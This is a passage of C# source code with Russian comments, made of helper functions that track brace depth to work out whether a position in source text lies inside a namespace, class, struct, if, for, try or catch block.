                {
                    return i;
                }
            }
            return 0;
        }

        //блок для различия частей кода
        static string TryString = "";
        static string CatchString = "";
        static string ClassString = "";
        static string ClassName = "";
        static string NamespaceString = "";
        static string NamespaceName = "";
        static string StructString = "";
        static string IfString = "";
        static string ForString = "";
        static string strFOX = "";
        static string strMBI = "";
        static int TryIndex = 0;
        static int CatchIndex = 0;
        static int ClassIndex = 0;
        static int NamespaceIndex = 0;
        static int StructIndex = 0;
        static int ForIndex = 0;
        static int IfIndex = 0;
        static int TrySkobkaOpen = 0;
        static int TrySkobkaClose = 0;
        static int CatchSkobkaOpen = 0;
        static int CatchSkobkaClose = 0;
        static int ClassSkobkaOpen = 0;
        static int ClassSkobkaClose = 0;
        static int NamespaceSkobkaOpen = 0;
        static int NamespaceSkobkaClose = 0;
        static int StructSkobkaOpen = 0;
        static int StructSkobkaClose = 0;
        static int ForSkobkaOpen = 0;
        static int ForSkobkaClose = 0;
        static int IfSkobkaOpen = 0;
        static int IfSkobkaClose = 0;
        //

        private static bool IsInNamespaceExpression(ref string str0, ref int ind0)//определение находимся ли мы сейчас в пространстве имен
        {
            string strT = "";
            if (ind0 < str0.Length - 12)
            {
                strT = str0.Substring(ind0, 11);
            }
            if (strT == " namespace ")
            {
                NamespaceString = " namespace ";
                NamespaceSkobkaOpen = 0;
                NamespaceSkobkaClose = 0;
                NamespaceIndex = ind0;
                NamespaceName = FindNameBase(ref str0, ref ind0);//найдем имя текущего пространства имен
            }
            if (NamespaceString == " namespace ")
            {
                if (str0.Substring(ind0, 1) == "{")
                {
                    NamespaceSkobkaOpen++;
                }
                if (str0.Substring(ind0, 1) == "}")
                {
                    NamespaceSkobkaClose++;
                }

                if (NamespaceSkobkaOpen == NamespaceSkobkaClose && NamespaceSkobkaOpen >= 1)
                {
                    NamespaceSkobkaOpen = 0;
                    NamespaceSkobkaClose = 0;
                    NamespaceString = "";
                    NamespaceName = "";
                }

                if ((NamespaceSkobkaOpen - NamespaceSkobkaClose) == 1)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            return false;
        }

        private static bool IsInClassExpression(ref string str0, ref int ind0)//определение находимся ли мы сейчас в определении class
        {
            string strT = "";
            if (ind0 < str0.Length - 8)
            {
                strT = str0.Substring(ind0, 7);
            }
            if (strT == " class ")
            {
                ClassString = " class ";
                ClassSkobkaOpen = 0;
                ClassSkobkaClose = 0;
                ClassIndex = ind0;
                ClassName = FindNameBase(ref str0, ref ind0);//найдем имя текущего класса
            }
            if (ClassString == " class ")
            {
                if (str0.Substring(ind0, 1) == "{")
                {
                    ClassSkobkaOpen++;
                }
                if (str0.Substring(ind0, 1) == "}")
                {
                    ClassSkobkaClose++;
                }

                if (ClassSkobkaOpen == ClassSkobkaClose && ClassSkobkaOpen >= 1)
                {
                    ClassSkobkaOpen = 0;
                    ClassSkobkaClose = 0;
                    ClassString = "";
                    ClassName = "";
                }

                if ( (ClassSkobkaOpen - ClassSkobkaClose) == 1 )
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            return false;
        }

        private static int IsInStruct(ref string str0, ref int ind0)//определение находимся ли мы сейчас в определении struct
        {
            string strT = "";
            string FOX = "[StructLayout(LayoutKind.Explicit)]";
            string MBI = "MEMORY_BASIC_INFORMATION";
            if (ind0 < str0.Length - 9)
            {
                strT = str0.Substring(ind0, 8);
            }

            if (ind0 < (str0.Length - FOX.Length - 1) && strFOX != FOX )
            {
                strFOX = str0.Substring(ind0, FOX.Length);
            }

            if (ind0 < (str0.Length - MBI.Length - 1) && strMBI != MBI)
            {
                strMBI = str0.Substring(ind0, MBI.Length);
            }

            if (strT == " struct ")
            {
                StructString = " struct ";
                StructSkobkaOpen = 0;
                StructSkobkaClose = 0;
                StructIndex = ind0;
            }
            if (StructString == " struct ")
            {
                if (str0.Substring(ind0, 1) == "{")
                {
                    StructSkobkaOpen++;
                }
                if (str0.Substring(ind0, 1) == "}")
                {
                    StructSkobkaClose++;
                }

                if (StructSkobkaOpen == StructSkobkaClose && StructSkobkaOpen >= 1)
                {
                    StructSkobkaOpen = 0;
                    StructSkobkaClose = 0;
                    StructString = "";
                    strFOX = "";
                    strMBI = "";
                }

                if (StructSkobkaOpen != StructSkobkaClose && StructSkobkaOpen >= 1 && strMBI != MBI )
                {
                    if ( strFOX == FOX )
                    {
                        return 2;
                    }
                    else
                    {
                        return 1;
                    }
                }
                else if ( strMBI == MBI )
                {
                    return -1;
                }
                else
                {
                    return 0;
                }
            }
            return 0;
        }

        private static bool IsNotInIfShort(ref string str0, ref int ind0)//определение находимся ли мы сейчас везде кроме короткого блока if
        {
            string strT = "";
            string strTx = "";
            if (ind0 < str0.Length - 5)
            {
                strT = str0.Substring(ind0, 4);
            }
            if (ind0 < str0.Length - 3)
            {
                strTx = str0.Substring(ind0, 3);
            }

            if ( strT == " if " || strT == " if(" || strT == "if (")
            {
                IfString = strT;
                IfSkobkaOpen = 0;
                IfSkobkaClose = 0;
                IfIndex = ind0;
            }

            if ( strTx == "if " )
            {
                IfString = strTx;
                IfSkobkaOpen = 0;
                IfSkobkaClose = 0;
                IfIndex = ind0;
            }

            if (IfString == " if " || IfString == "if " || strT == " if(" || strT == "if (")
            {
                if (str0.Substring(ind0, 1) == "{")
                {
                    IfSkobkaOpen++;
                }
                if (str0.Substring(ind0, 1) == "}")
                {
                    IfSkobkaClose++;
                }

                if (IfSkobkaOpen == IfSkobkaClose && IfSkobkaOpen >= 1)
                {
                    IfSkobkaOpen = 0;
                    IfSkobkaClose = 0;
                    IfString = "";
                }

                if (IfSkobkaOpen != IfSkobkaClose && IfSkobkaOpen >= 1)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            return true;
        }

        private static bool IsInFor(ref string str0, ref int ind0)//определение находимся ли мы сейчас в блоке for
        {
            string strT = "";
            string strTx = "";
            if (ind0 < str0.Length - 6)
            {
                strT = str0.Substring(ind0, 5);
            }
            if (ind0 < str0.Length - 5)
            {
                strTx = str0.Substring(ind0, 4);
            }

            if (strT == " for " || strT == "for (")
            {
                ForString = strT;
                ForIndex = ind0;
                ForSkobkaOpen = 0;
                ForSkobkaClose = 0;
            }

            if (strTx == "for(")
            {
                ForString = strTx;
                ForIndex = ind0;
                ForSkobkaOpen = 0;
                ForSkobkaClose = 0;
            }

            if ( ForString == " for " || ForString == "for(" || ForString == "for (" )
            {
                if (str0.Substring(ind0, 1) == "{")
                {
                    ForSkobkaOpen++;
                }
                if (str0.Substring(ind0, 1) == "}")
                {
                    ForSkobkaClose++;
                }

                if (ForSkobkaOpen == ForSkobkaClose && ForSkobkaOpen >= 1)
                {
                    ForSkobkaOpen = 0;
                    ForSkobkaClose = 0;
                    ForString = "";
                }

                if (ForSkobkaOpen != ForSkobkaClose && ForSkobkaOpen >= 1)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            return true;
        }

        private static bool IsInTry(ref string str0,ref int ind0)//определение находимся ли мы сейчас в блоке try
        {
            string strT = "";
            string strTx = "";
            if (ind0 < str0.Length-6)
            {
                strT=str0.Substring(ind0, 5);
            }
            if (ind0 < str0.Length - 5)
            {
                strTx = str0.Substring(ind0, 4);
            }

            if ( strT == " try " || strT == " try{" )
            {
                TryString = strT;
                TrySkobkaOpen = 0;
                TrySkobkaClose = 0;
                TryIndex = ind0;
            }

            if ( strTx == "try{")
            {
                TryString = strTx;
                TrySkobkaOpen = 0;
                TrySkobkaClose = 0;
                TryIndex = ind0;
            }

            if (TryString == " try ")
            {
                if (str0.Substring(ind0, 1) == "{")
                {
                    TrySkobkaOpen++;
                }
                if (str0.Substring(ind0, 1) == "}")
                {
                    TrySkobkaClose++;
                }

                if (TrySkobkaOpen == TrySkobkaClose && TrySkobkaOpen >= 1)
                {
                    TrySkobkaOpen = 0;
                    TrySkobkaClose = 0;
                    TryString = "";
                }

                if (TrySkobkaOpen != TrySkobkaClose && TrySkobkaOpen >= 1)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }

            if (TryString == " try{" || TryString == "try{")
            {
                if ( TrySkobkaOpen == 0 )
                {
                    TrySkobkaOpen++;
                }

                if (str0.Substring(ind0, 1) == "{")
                {
                    TrySkobkaOpen++;
                }
                if (str0.Substring(ind0, 1) == "}")
                {
                    TrySkobkaClose++;
                }

                if (TrySkobkaOpen == TrySkobkaClose && TrySkobkaOpen >= 1)
                {
                    TrySkobkaOpen = 0;
                    TrySkobkaClose = 0;
                    TryString = "";
                }

                if (TrySkobkaOpen != TrySkobkaClose && TrySkobkaOpen >= 1)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            return false;
        }

        private static bool IsInCatch(ref string str0, ref int ind0)//определение находимся ли мы сейчас в блоке catch
        {
            string strT = "";
            string strTx = "";
            if (ind0 < str0.Length - 8)
            {
                strT = str0.Substring(ind0, 7);
            }
            if (ind0 < str0.Length - 7)
            {
                strTx = str0.Substring(ind0, 6);
            }

            if (strT == " catch " || strT == " catch{")
            {
                CatchString = strT;
                CatchSkobkaOpen = 0;
                CatchSkobkaClose = 0;
                CatchIndex = ind0;
            }

            if (strTx == "catch{")
            {
                CatchString = strTx;
                CatchSkobkaOpen = 0;
                CatchSkobkaClose = 0;
                CatchIndex = ind0;
            }

            if ( CatchString == " catch " )
            {
                if (str0.Substring(ind0, 1) == "{")
                {
                    CatchSkobkaOpen++;
                }
                if (str0.Substring(ind0, 1) == "}")
                {
                    CatchSkobkaClose++;
                }

                if (CatchSkobkaOpen == CatchSkobkaClose && CatchSkobkaOpen >= 1)
                {
                    CatchSkobkaOpen = 0;
                    CatchSkobkaClose = 0;
                    CatchString = "";
                }

                if (CatchSkobkaOpen != CatchSkobkaClose && CatchSkobkaOpen >= 1)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }

            if (CatchString == " catch{" || CatchString == "catch{")
            {
                if (CatchSkobkaOpen == 0)
                {
                    CatchSkobkaOpen++;
                }

                if (str0.Substring(ind0, 1) == "{")
                {
                    CatchSkobkaOpen++;
                }
                if (str0.Substring(ind0, 1) == "}")
                {
                    CatchSkobkaClose++;
                }

                if (CatchSkobkaOpen == CatchSkobkaClose && CatchSkobkaOpen >= 1)
                {
                    CatchSkobkaOpen = 0;
                    CatchSkobkaClose = 0;
                    CatchString = "";
                }

                if (CatchSkobkaOpen != CatchSkobkaClose && CatchSkobkaOpen >= 1)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            return false;
        }



    }
}
